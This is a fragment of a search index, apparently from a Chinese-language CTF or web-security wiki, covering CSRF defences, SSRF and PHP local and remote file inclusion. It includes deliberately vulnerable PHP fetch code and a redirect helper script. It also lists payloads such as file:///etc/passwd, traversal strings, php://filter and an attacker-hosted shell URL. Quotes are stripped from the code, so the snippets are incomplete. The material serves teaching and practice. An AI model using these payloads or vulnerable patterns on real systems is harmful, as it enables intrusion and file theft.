            "location": "/web/csrf/#_1", 
            "text": "\u9a8c\u8bc1\u7801\u5f3a\u5236\u7528\u6237\u5fc5\u987b\u4e0e\u5e94\u7528\u8fdb\u884c\u4ea4\u4e92\uff0c\u624d\u80fd\u5b8c\u6210\u6700\u7ec8\u8bf7\u6c42\u3002", 
            "title": "\u9a8c\u8bc1\u7801"
        }, 
        {
            "location": "/web/csrf/#referer-check", 
            "text": "\u68c0\u67e5\u8bf7\u6c42\u662f\u5426\u6765\u81ea\u5408\u6cd5\u7684\u6e90\u3002\u4f46\u670d\u52a1\u5668\u5e76\u975e\u4ec0\u4e48\u65f6\u5019\u90fd\u80fd\u53d6\u5f97 Referer\u3002", 
            "title": "Referer Check"
        }, 
        {
            "location": "/web/csrf/#token", 
            "text": "CSRF \u80fd\u591f\u653b\u51fb\u6210\u529f\u7684\u672c\u8d28\u539f\u56e0\u662f\u91cd\u8981\u64cd\u4f5c\u7684\u6240\u6709\u53c2\u6570\u90fd\u53ef\u4ee5\u88ab\u653b\u51fb\u8005\u731c\u6d4b\u5f97\u5230\u3002  \u4fdd\u6301\u539f\u53c2\u6570\u4e0d\u53d8\uff0c\u65b0\u589e\u4e00\u4e2a\u53c2\u6570 Token\uff0c\u503c\u662f\u968f\u673a\u7684\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\uff0cToken \u53ef\u4ee5\u653e\u5728\u7528\u6237\u7684 Session \u4e2d\uff0c\u6216\u6d4f\u89c8\u5668\u7684 Cookies \u4e2d\u3002  Token \u4e00\u5b9a\u8981\u8db3\u591f\u968f\u673a\u3002\u6b64\u5916\uff0cToken \u7684\u76ee\u7684\u4e0d\u662f\u4e3a\u4e86\u9632\u6b62\u91cd\u590d\u63d0\u4ea4\uff0c\u6240\u4ee5\u4e3a\u4e86\u4f7f\u7528\u65b9\u4fbf\uff0c\u53ef\u4ee5\u5141\u8bb8\u5728\u4e00\u4e2a\u7528\u6237\u7684\u6709\u6548\u751f\u547d\u5468\u671f\u5185\uff0c\u5728 Token \u6d88\u8017\u6389\u4e4b\u524d\u90fd\u4f7f\u7528\u540c\u4e00\u4e2a Token\uff0c\u4f46\u5982\u679c\u7528\u6237\u5df2\u7ecf\u63d0\u4ea4\u4e86\u8868\u5355\uff0c\u5219\u8fd9\u4e2a Token \u5df2\u7ecf\u6d88\u8017\u6389\uff0c\u5e94\u8be5\u91cd\u65b0\u751f\u6210 Token\u3002  Token \u8fd8\u5e94\u6ce8\u610f\u5176\u4fdd\u5bc6\u6027\uff0c\u5982\u679c Token \u51fa\u73b0\u5728 URL \u4e2d\uff0c\u5219\u53ef\u80fd\u4f1a\u901a\u8fc7 Referer \u6cc4\u9732\uff0c\u5e94\u5c3d\u91cf\u628a Token \u653e\u5728\u8868\u5355\u4e2d\uff0c\u628a\u654f\u611f\u64cd\u4f5c\u7531 GET \u6539\u4e3a POST\uff0c\u4ee5\u8868\u5355\u6216 AJAX \u7684\u5f62\u5f0f\u63d0\u4ea4\uff0c\u907f\u514d Token \u6cc4\u9732\u3002", 
            "title": "Token"
        }, 
        {
            "location": "/web/ssrf/", 
            "text": "SSRF \u7b80\u4ecb\n\n\nSSRF\uff0cServer-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u5668\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002\n\n\n\u6f0f\u6d1e\u5f62\u6210\u7684\u539f\u56e0\u5927\u591a\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u4f5c\u8fc7\u6ee4\u548c\u9650\u5236\u3002\n\n\n\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 SSRF \u5b9e\u73b0\u7684\u653b\u51fb\u4e3b\u8981\u6709 5 \u79cd\uff1a\n\n\n\n\n\u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f\n\n\n\u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09\n\n\n\u5bf9\u5185\u7f51 WEB \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0\n\n\n\u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 GET \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 Struts2\uff0csqli \u7b49\uff09\n\n\n\u5229\u7528 \nfile\n \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49\n\n\n\n\nSSRF \u6f0f\u6d1e\u51fa\u73b0\u7684\u573a\u666f\n\n\n\n\n\u80fd\u591f\u5bf9\u5916\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\u7684\u5730\u65b9\uff0c\u5c31\u53ef\u80fd\u5b58\u5728 SSRF \u6f0f\u6d1e\n\n\n\u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u8bf7\u6c42\u8d44\u6e90\uff08Upload from URL\uff0cImport \n Export RSS Feed\uff09\n\n\n\u6570\u636e\u5e93\u5185\u7f6e\u529f\u80fd\uff08Oracle\u3001MongoDB\u3001MSSQL\u3001Postgres\u3001CouchDB\uff09\n\n\nWebmail \u6536\u53d6\u5176\u4ed6\u90ae\u7bb1\u90ae\u4ef6\uff08POP3\u3001IMAP\u3001SMTP\uff09\n\n\n\u6587\u4ef6\u5904\u7406\u3001\u7f16\u7801\u5904\u7406\u3001\u5c5e\u6027\u4fe1\u606f\u5904\u7406\uff08ffmpeg\u3001ImageMagic\u3001DOCX\u3001PDF\u3001XML\uff09\n\n\n\n\n\u5e38\u7528\u7684\u540e\u7aef\u5b9e\u73b0\n\n\n\n\n\n\nfile_get_contents\n\n\n?php\n\n\nif\n \n(\nisset\n(\n$_POST\n[\nurl\n]))\n \n{\n \n    \n$content\n \n=\n \nfile_get_contents\n(\n$_POST\n[\nurl\n]);\n \n    \n$filename\n \n=\n./images/\n.\nrand\n()\n.\n;img1.jpg\n;\n \n    \nfile_put_contents\n(\n$filename\n,\n \n$content\n);\n \n    \necho\n \n$_POST\n[\nurl\n];\n \n    \n$img\n \n=\n \nimg src=\n\\\n.\n$filename\n.\n\\\n/\n;\n \n\n}\n\n\necho\n \n$img\n;\n\n\n?\n\n\n\n\n\n\u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528 \nfile_get_contents\n \u51fd\u6570\u4ece\u7528\u6237\u6307\u5b9a\u7684 URL \u83b7\u53d6\u56fe\u7247\u3002\u7136\u540e\u628a\u5b83\u7528\u4e00\u4e2a\u968f\u5373\u6587\u4ef6\u540d\u4fdd\u5b58\u5728\u786c\u76d8\u4e0a\uff0c\u5e76\u5c55\u793a\u7ed9\u7528\u6237\u3002\n\n\n\n\n\n\nfsockopen()\n\n\n?php\n \n\nfunction\n \nGetFile\n(\n$host\n,\n$port\n,\n$link\n)\n \n{\n \n    \n$fp\n \n=\n \nfsockopen\n(\n$host\n,\n \nintval\n(\n$port\n),\n \n$errno\n,\n \n$errstr\n,\n \n30\n);\n \n    \nif\n \n(\n!\n$fp\n)\n \n{\n \n        \necho\n \n$errstr\n (error number \n$errno\n) \n\\n\n;\n \n    \n}\n \nelse\n \n{\n \n        \n$out\n \n=\n \nGET \n$link\n HTTP/1.1\n\\r\\n\n;\n \n        \n$out\n \n.=\n \nHost: \n$host\\r\\n\n;\n \n        \n$out\n \n.=\n \nConnection: Close\n\\r\\n\\r\\n\n;\n \n        \n$out\n \n.=\n \n\\r\\n\n;\n \n        \nfwrite\n(\n$fp\n,\n \n$out\n);\n \n        \n$contents\n=\n;\n \n        \nwhile\n \n(\n!\nfeof\n(\n$fp\n))\n \n{\n \n            \n$contents\n.=\n \nfgets\n(\n$fp\n,\n \n1024\n);\n \n        \n}\n \n        \nfclose\n(\n$fp\n);\n \n        \nreturn\n \n$contents\n;\n \n    \n}\n \n\n}\n\n\n?\n\n\n\n\n\n\u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528 \nfsockopen\n \u51fd\u6570\u5b9e\u73b0\u83b7\u53d6\u7528\u6237\u5236\u5b9a URL \u7684\u6570\u636e\uff08\u6587\u4ef6\u6216\u8005 HTML\uff09\u3002\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4f7f\u7528 socket \u8ddf\u670d\u52a1\u5668\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u4f20\u8f93\u539f\u59cb\u6570\u636e\u3002\n\n\n\n\n\n\ncurl_exec()\n\n\n?php\n \n\nif\n \n(\nisset\n(\n$_POST\n[\nurl\n]))\n \n{\n\n    \n$link\n \n=\n \n$_POST\n[\nurl\n];\n\n    \n$curlobj\n \n=\n \ncurl_init\n();\n\n    \ncurl_setopt\n(\n$curlobj\n,\n \nCURLOPT_POST\n,\n \n0\n);\n\n    \ncurl_setopt\n(\n$curlobj\n,\nCURLOPT_URL\n,\n$link\n);\n\n    \ncurl_setopt\n(\n$curlobj\n,\n \nCURLOPT_RETURNTRANSFER\n,\n \n1\n);\n\n    \n$result\n=\ncurl_exec\n(\n$curlobj\n);\n\n    \ncurl_close\n(\n$curlobj\n);\n\n\n    \n$filename\n \n=\n \n./curled/\n.\nrand\n()\n.\n.txt\n;\n\n    \nfile_put_contents\n(\n$filename\n,\n \n$result\n);\n \n    \necho\n \n$result\n;\n\n\n}\n\n\n?\n\n\n\n\n\n\u4f7f\u7528 \ncurl\n \u83b7\u53d6\u6570\u636e\u3002\n\n\n\n\n\n\n\u963b\u788d SSRF \u6f0f\u6d1e\u5229\u7528\u7684\u573a\u666f\n\n\n\n\n\u670d\u52a1\u5668\u5f00\u542f OpenSSL \u65e0\u6cd5\u8fdb\u884c\u4ea4\u4e92\u5229\u7528\n\n\n\u670d\u52a1\u7aef\u9700\u8981\u9274\u6743\uff08Cookies \n User\uff1aPass\uff09\u4e0d\u80fd\u5b8c\u7f8e\u5229\u7528\n\n\n\n\n\u5229\u7528 SSRF \u8fdb\u884c\u7aef\u53e3\u626b\u63cf\n\n\n\u6839\u636e\u670d\u52a1\u5668\u7684\u8fd4\u56de\u4fe1\u606f\u8fdb\u884c\u5224\u65ad\uff0c\u5927\u90e8\u5206\u5e94\u7528\u4e0d\u4f1a\u5224\u522b\u7aef\u53e3\uff0c\u53ef\u901a\u8fc7\u8fd4\u56de\u7684 banner \u4fe1\u606f\u5224\u65ad\u7aef\u53e3\u72b6\u6001\u3002\n\n\n\u540e\u7aef\u5b9e\u73b0\n\n\n?php\n \n\nif\n \n(\nisset\n(\n$_POST\n[\nurl\n]))\n \n{\n\n    \n$link\n \n=\n \n$_POST\n[\nurl\n];\n\n    \n$filename\n \n=\n \n./curled/\n.\nrand\n()\n.\ntxt\n;\n\n    \n$curlobj\n \n=\n \ncurl_init\n(\n$link\n);\n\n    \n$fp\n \n=\n \nfopen\n(\n$filename\n,\nw\n);\n\n    \ncurl_setopt\n(\n$curlobj\n,\n \nCURLOPT_FILE\n,\n \n$fp\n);\n\n    \ncurl_setopt\n(\n$curlobj\n,\n \nCURLOPT_HEADER\n,\n \n0\n);\n\n    \ncurl_exec\n(\n$curlobj\n);\n\n    \ncurl_close\n(\n$curlobj\n);\n\n    \nfclose\n(\n$fp\n);\n\n    \n$fp\n \n=\n \nfopen\n(\n$filename\n,\nr\n);\n\n    \n$result\n \n=\n \nfread\n(\n$fp\n,\n \nfilesize\n(\n$filename\n));\n \n    \nfclose\n(\n$fp\n);\n\n    \necho\n \n$result\n;\n\n\n}\n\n\n?\n\n\n\n\n\n\u6784\u9020\u4e00\u4e2a\u524d\u7aef\u9875\u9762\n\n\nhtml\n\n\nbody\n\n  \nform\n \nname\n=\npx\n \nmethod\n=\npost\n \naction\n=\nhttp://127.0.0.1/ss.php\n\n    \ninput\n \ntype\n=\ntext\n \nname\n=\nurl\n \nvalue\n=\n\n    \ninput\n \ntype\n=\nsubmit\n \nname\n=\ncommit\n \nvalue\n=\nsubmit\n\n  \n/\nform\n\n  \nscript\n/\nscript\n\n\n/\nbody\n\n\n/\nhtml\n\n\n\n\n\n\u8bf7\u6c42\u975e HTTP \u7684\u7aef\u53e3\u53ef\u4ee5\u8fd4\u56de banner \u4fe1\u606f\u3002\n\n\n\u6216\u53ef\u5229\u7528 302 \u8df3\u8f6c\u7ed5\u8fc7 HTTP \u534f\u8bae\u7684\u9650\u5236\u3002\n\n\n\u8f85\u52a9\u811a\u672c\n\n\n?php\n\n\n$ip\n \n=\n \n$_GET\n[\nip\n];\n\n\n$port\n \n=\n \n$_GET\n[\nport\n];\n\n\n$scheme\n \n=\n \n$_GET\n[\ns\n];\n\n\n$data\n \n=\n \n$_GET\n[\ndata\n];\n\n\nheader\n(\nLocation: \n$scheme\n://\n$ip\n:\n$port\n/\n$data\n);\n\n\n?\n\n\n\n\n\n\u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c\n\n\n\u534f\u8bae\u5229\u7528\n\n\n\n\n\n\nDict \u534f\u8bae\n\n\ndict://fuzz.wuyun.org:8080/helo:dict\n\n\n\n\n\n\n\n\nGopher \u534f\u8bae\n\n\ngopher://fuzz.wuyun.org:8080/gopher\n\n\n\n\n\n\n\n\nFile \u534f\u8bae\n\n\nfile:///etc/passwd\n\n\n\n\n\n\n\n\n\u53c2\u8003\u8d44\u6599\n\n\n\n\n\u300aBuild Your SSRF EXP Autowork\u300b\u732a\u732a\u4fa0\n\n\n\u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c\n\n\nbilibili \u67d0\u5206\u7ad9\u4ece\u4fe1\u606f\u6cc4\u9732\u5230 ssrf \u518d\u5230\u547d\u4ee4\u6267\u884c", 
            "title": "SSRF \u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020"
        }, 
        {
            "location": "/web/ssrf/#ssrf", 
            "text": "SSRF\uff0cServer-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff0c\u662f\u4e00\u79cd\u7531\u653b\u51fb\u8005\u6784\u9020\u5f62\u6210\u7531\u670d\u52a1\u5668\u7aef\u53d1\u8d77\u8bf7\u6c42\u7684\u4e00\u4e2a\u6f0f\u6d1e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0cSSRF \u653b\u51fb\u7684\u76ee\u6807\u662f\u4ece\u5916\u7f51\u65e0\u6cd5\u8bbf\u95ee\u7684\u5185\u90e8\u7cfb\u7edf\u3002  \u6f0f\u6d1e\u5f62\u6210\u7684\u539f\u56e0\u5927\u591a\u662f\u56e0\u4e3a\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u4ece\u5176\u4ed6\u670d\u52a1\u5668\u5e94\u7528\u83b7\u53d6\u6570\u636e\u7684\u529f\u80fd\u4e14\u6ca1\u6709\u5bf9\u76ee\u6807\u5730\u5740\u4f5c\u8fc7\u6ee4\u548c\u9650\u5236\u3002  \u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528 SSRF \u5b9e\u73b0\u7684\u653b\u51fb\u4e3b\u8981\u6709 5 \u79cd\uff1a   \u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f  \u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09  \u5bf9\u5185\u7f51 WEB \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0  \u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 GET \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 Struts2\uff0csqli \u7b49\uff09  \u5229\u7528  file  \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49", 
            "title": "SSRF \u7b80\u4ecb"
        }, 
        {
            "location": "/web/ssrf/#ssrf_1", 
            "text": "\u80fd\u591f\u5bf9\u5916\u53d1\u8d77\u7f51\u7edc\u8bf7\u6c42\u7684\u5730\u65b9\uff0c\u5c31\u53ef\u80fd\u5b58\u5728 SSRF \u6f0f\u6d1e  \u4ece\u8fdc\u7a0b\u670d\u52a1\u5668\u8bf7\u6c42\u8d44\u6e90\uff08Upload from URL\uff0cImport   Export RSS Feed\uff09  \u6570\u636e\u5e93\u5185\u7f6e\u529f\u80fd\uff08Oracle\u3001MongoDB\u3001MSSQL\u3001Postgres\u3001CouchDB\uff09  Webmail \u6536\u53d6\u5176\u4ed6\u90ae\u7bb1\u90ae\u4ef6\uff08POP3\u3001IMAP\u3001SMTP\uff09  \u6587\u4ef6\u5904\u7406\u3001\u7f16\u7801\u5904\u7406\u3001\u5c5e\u6027\u4fe1\u606f\u5904\u7406\uff08ffmpeg\u3001ImageMagic\u3001DOCX\u3001PDF\u3001XML\uff09", 
            "title": "SSRF \u6f0f\u6d1e\u51fa\u73b0\u7684\u573a\u666f"
        }, 
        {
            "location": "/web/ssrf/#_1", 
            "text": "file_get_contents  ?php  if   ( isset ( $_POST [ url ]))   {  \n     $content   =   file_get_contents ( $_POST [ url ]);  \n     $filename   = ./images/ . rand () . ;img1.jpg ;  \n     file_put_contents ( $filename ,   $content );  \n     echo   $_POST [ url ];  \n     $img   =   img src= \\ . $filename . \\ / ;   }  echo   $img ;  ?   \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528  file_get_contents  \u51fd\u6570\u4ece\u7528\u6237\u6307\u5b9a\u7684 URL \u83b7\u53d6\u56fe\u7247\u3002\u7136\u540e\u628a\u5b83\u7528\u4e00\u4e2a\u968f\u5373\u6587\u4ef6\u540d\u4fdd\u5b58\u5728\u786c\u76d8\u4e0a\uff0c\u5e76\u5c55\u793a\u7ed9\u7528\u6237\u3002    fsockopen()  ?php   function   GetFile ( $host , $port , $link )   {  \n     $fp   =   fsockopen ( $host ,   intval ( $port ),   $errno ,   $errstr ,   30 );  \n     if   ( ! $fp )   {  \n         echo   $errstr  (error number  $errno )  \\n ;  \n     }   else   {  \n         $out   =   GET  $link  HTTP/1.1 \\r\\n ;  \n         $out   .=   Host:  $host\\r\\n ;  \n         $out   .=   Connection: Close \\r\\n\\r\\n ;  \n         $out   .=   \\r\\n ;  \n         fwrite ( $fp ,   $out );  \n         $contents = ;  \n         while   ( ! feof ( $fp ))   {  \n             $contents .=   fgets ( $fp ,   1024 );  \n         }  \n         fclose ( $fp );  \n         return   $contents ;  \n     }   }  ?   \u8fd9\u6bb5\u4ee3\u7801\u4f7f\u7528  fsockopen  \u51fd\u6570\u5b9e\u73b0\u83b7\u53d6\u7528\u6237\u5236\u5b9a URL \u7684\u6570\u636e\uff08\u6587\u4ef6\u6216\u8005 HTML\uff09\u3002\u8fd9\u4e2a\u51fd\u6570\u4f1a\u4f7f\u7528 socket \u8ddf\u670d\u52a1\u5668\u5efa\u7acb TCP \u8fde\u63a5\uff0c\u4f20\u8f93\u539f\u59cb\u6570\u636e\u3002    curl_exec()  ?php   if   ( isset ( $_POST [ url ]))   { \n     $link   =   $_POST [ url ]; \n     $curlobj   =   curl_init (); \n     curl_setopt ( $curlobj ,   CURLOPT_POST ,   0 ); \n     curl_setopt ( $curlobj , CURLOPT_URL , $link ); \n     curl_setopt ( $curlobj ,   CURLOPT_RETURNTRANSFER ,   1 ); \n     $result = curl_exec ( $curlobj ); \n     curl_close ( $curlobj ); \n\n     $filename   =   ./curled/ . rand () . .txt ; \n     file_put_contents ( $filename ,   $result );  \n     echo   $result ;  }  ?   \u4f7f\u7528  curl  \u83b7\u53d6\u6570\u636e\u3002", 
            "title": "\u5e38\u7528\u7684\u540e\u7aef\u5b9e\u73b0"
        }, 
        {
            "location": "/web/ssrf/#ssrf_2", 
            "text": "\u670d\u52a1\u5668\u5f00\u542f OpenSSL \u65e0\u6cd5\u8fdb\u884c\u4ea4\u4e92\u5229\u7528  \u670d\u52a1\u7aef\u9700\u8981\u9274\u6743\uff08Cookies   User\uff1aPass\uff09\u4e0d\u80fd\u5b8c\u7f8e\u5229\u7528", 
            "title": "\u963b\u788d SSRF \u6f0f\u6d1e\u5229\u7528\u7684\u573a\u666f"
        }, 
        {
            "location": "/web/ssrf/#ssrf_3", 
            "text": "\u6839\u636e\u670d\u52a1\u5668\u7684\u8fd4\u56de\u4fe1\u606f\u8fdb\u884c\u5224\u65ad\uff0c\u5927\u90e8\u5206\u5e94\u7528\u4e0d\u4f1a\u5224\u522b\u7aef\u53e3\uff0c\u53ef\u901a\u8fc7\u8fd4\u56de\u7684 banner \u4fe1\u606f\u5224\u65ad\u7aef\u53e3\u72b6\u6001\u3002  \u540e\u7aef\u5b9e\u73b0  ?php   if   ( isset ( $_POST [ url ]))   { \n     $link   =   $_POST [ url ]; \n     $filename   =   ./curled/ . rand () . txt ; \n     $curlobj   =   curl_init ( $link ); \n     $fp   =   fopen ( $filename , w ); \n     curl_setopt ( $curlobj ,   CURLOPT_FILE ,   $fp ); \n     curl_setopt ( $curlobj ,   CURLOPT_HEADER ,   0 ); \n     curl_exec ( $curlobj ); \n     curl_close ( $curlobj ); \n     fclose ( $fp ); \n     $fp   =   fopen ( $filename , r ); \n     $result   =   fread ( $fp ,   filesize ( $filename ));  \n     fclose ( $fp ); \n     echo   $result ;  }  ?   \u6784\u9020\u4e00\u4e2a\u524d\u7aef\u9875\u9762  html  body \n   form   name = px   method = post   action = http://127.0.0.1/ss.php \n     input   type = text   name = url   value = \n     input   type = submit   name = commit   value = submit \n   / form \n   script / script  / body  / html   \u8bf7\u6c42\u975e HTTP \u7684\u7aef\u53e3\u53ef\u4ee5\u8fd4\u56de banner \u4fe1\u606f\u3002  \u6216\u53ef\u5229\u7528 302 \u8df3\u8f6c\u7ed5\u8fc7 HTTP \u534f\u8bae\u7684\u9650\u5236\u3002  \u8f85\u52a9\u811a\u672c  ?php  $ip   =   $_GET [ ip ];  $port   =   $_GET [ port ];  $scheme   =   $_GET [ s ];  $data   =   $_GET [ data ];  header ( Location:  $scheme :// $ip : $port / $data );  ?   \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c", 
            "title": "\u5229\u7528 SSRF \u8fdb\u884c\u7aef\u53e3\u626b\u63cf"
        }, 
        {
            "location": "/web/ssrf/#_2", 
            "text": "Dict \u534f\u8bae  dict://fuzz.wuyun.org:8080/helo:dict    Gopher \u534f\u8bae  gopher://fuzz.wuyun.org:8080/gopher    File \u534f\u8bae  file:///etc/passwd", 
            "title": "\u534f\u8bae\u5229\u7528"
        }, 
        {
            "location": "/web/ssrf/#_3", 
            "text": "\u300aBuild Your SSRF EXP Autowork\u300b\u732a\u732a\u4fa0  \u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c  bilibili \u67d0\u5206\u7ad9\u4ece\u4fe1\u606f\u6cc4\u9732\u5230 ssrf \u518d\u5230\u547d\u4ee4\u6267\u884c", 
            "title": "\u53c2\u8003\u8d44\u6599"
        }, 
        {
            "location": "/web/php/", 
            "text": "\u6587\u4ef6\u5305\u542b\n\n\n\u5e38\u89c1\u7684\u5bfc\u81f4\u6587\u4ef6\u5305\u542b\u7684\u51fd\u6570\u6709\uff1a\n\n\n\n\nPHP\uff1a\ninclude()\n\uff0c\ninclude_once()\n\uff0c\nrequire()\n\uff0c\nrequire_once()\n\uff0c\nfopen()\n\uff0c\nreadfile()\n \u7b49\n\n\nJSP Servlet\uff1a\nava.io.File()\n\uff0c\njava.io.FileReader()\n \u7b49\n\n\nASP\uff1a\nincludefile\n\uff0c\nincludevirtual\n \u7b49\n\n\n\n\n\u5f53 PHP \u5305\u542b\u4e00\u4e2a\u6587\u4ef6\u65f6\uff0c\u4f1a\u5c06\u8be5\u6587\u4ef6\u5f53\u505a PHP \u4ee3\u7801\u6267\u884c\uff0c\u800c\u4e0d\u4f1a\u5728\u610f\u6587\u4ef6\u65f6\u4ec0\u4e48\u7c7b\u578b\u3002\n\n\n\u672c\u5730\u6587\u4ef6\u5305\u542b\n\n\n\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0cLocal File Inclusion\uff0cLFI\u3002\n\n\n?php\n\n\n$file\n \n=\n \n$_GET\n[\nfile\n];\n\n\nif\n \n(\nfile_exists\n(\n/home/wwwrun/\n.\n$file\n.\n.php\n))\n \n{\n\n  \ninclude\n \n/home/wwwrun/\n.\n$file\n.\n.php\n;\n\n\n}\n\n\n?\n\n\n\n\n\n\u4e0a\u8ff0\u4ee3\u7801\u5b58\u5728\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0c\u53ef\u7528 %00 \u622a\u65ad\u7684\u65b9\u5f0f\u8bfb\u53d6 \n/etc/passwd\n \u6587\u4ef6\u5185\u5bb9\u3002\n\n\n\n\n\n\n%00\n \u622a\u65ad\n\n\n?file=../../../../../../../../../etc/passwd%00\n\n\n\n\n\u9700\u8981 \nmagic_quotes_gpc=off\n\uff0cPHP \u5c0f\u4e8e 5.3.4 \u6709\u6548\u3002\n\n\n\n\n\n\n\u8def\u5f84\u957f\u5ea6\u622a\u65ad\n\n\n?file=../../../../../../../../../etc/passwd/././././././.[\u2026]/./././././.\n\n\n\n\nLinux \u9700\u8981\u6587\u4ef6\u540d\u957f\u4e8e 4096\uff0cWindows \u9700\u8981\u957f\u4e8e 256\u3002\n\n\n\n\n\n\n\u70b9\u53f7\u622a\u65ad\n\n\n?file=../../../../../../../../../boot.ini/\u2026\u2026\u2026[\u2026]\u2026\u2026\u2026\u2026\n\n\n\n\n\u53ea\u9002\u7528 Windows\uff0c\u70b9\u53f7\u9700\u8981\u957f\u4e8e 256\u3002\n\n\n\n\n\n\n\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\n\n\n\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0cRemote File Inclusion\uff0cRFI\u3002\n\n\n?php\n\n\nif\n \n(\n$route\n \n==\n \nshare\n)\n \n{\n\n  \nrequire_once\n \n$basePath\n \n.\n \n/action/m_share.php\n;\n\n\n}\n \nelseif\n \n(\n$route\n \n==\n \nsharelink\n)\n \n{\n\n  \nrequire_once\n \n$basePath\n \n.\n \n/action/m_sharelink.php\n;\n\n\n}\n\n\n\n\n\n\u6784\u9020\u53d8\u91cf \nbasePath\n \u7684\u503c\u3002\n\n\n/?basePath=http://attacker/phpshell.txt?\n\n\n\n\n\u6700\u7ec8\u7684\u4ee3\u7801\u6267\u884c\u4e86\n\n\nrequire_once \nhttp://attacker/phpshell.txt?/action/m_share.php\n;\n\n\n\n\n\n\u95ee\u53f7\u540e\u7684\u90e8\u5206\u88ab\u89e3\u91ca\u4e3a URL \u7684 querystring\uff0c\u8fd9\u4e5f\u662f\u4e00\u79cd\u300c\u622a\u65ad\u300d\u3002\n\n\n\n\n\n\n\u666e\u901a\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\n\n\n?file=[http|https|ftp]://example.com/shell.txt\n\n\n\n\n\u9700\u8981 \nallow_url_fopen=On\n \u5e76\u4e14 \nallow_url_include=On\n \u3002\n\n\n\n\n\n\n\u5229\u7528 PHP \u6d41 input\n\n\n?file=php://input\n\n\n\n\n\u9700\u8981 \nallow_url_include=On\n \u3002\n\n\n\n\n\n\n\u5229\u7528 PHP \u6d41 filter\n\n\n?file=php://filter/convert.base64-encode/resource=index.php\n\n\n\n\n\u9700\u8981 \nallow_url_include=On\n \u3002\n\n\n\n\n\n\n\u5229\u7528 data URIs\n\n\n?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=\n\n\n\n\n\u9700\u8981 \nallow_url_include=On\n \u3002\n\n\n\n\n\n\n\u5229\u7528 XSS \u6267\u884c\n\n\n?file=http://127.0.0.1/path/xss.php?xss=phpcode\n\n\n\n\n\u9700\u8981 \nallow_url_fopen=On\n\uff0c\nallow_url_include=On\n 